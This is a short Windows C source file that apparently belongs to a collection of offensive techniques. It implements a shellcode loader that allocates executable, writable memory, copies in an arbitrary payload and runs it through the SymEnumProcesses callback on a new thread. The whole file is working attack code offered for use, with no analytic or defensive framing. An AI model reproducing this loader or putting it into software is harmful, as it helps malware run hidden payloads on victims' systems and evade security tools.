#include "Win32Helper.h"

VOID InvokeSymEnumProcessesCallbackRoutine(LPVOID lpParameter)
{
	if (!SymInitializeW(GetCurrentProcess(), NULL, FALSE))
		return;

#pragma warning( push )
#pragma warning( disable : 6387)
	SymEnumProcesses((PSYM_ENUMPROCESSES_CALLBACK)lpParameter, NULL);
#pragma warning( pop ) 

	SymCleanup(GetCurrentProcess());

}

BOOL MpfSceViaSymEnumProcesses(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeSymEnumProcessesCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}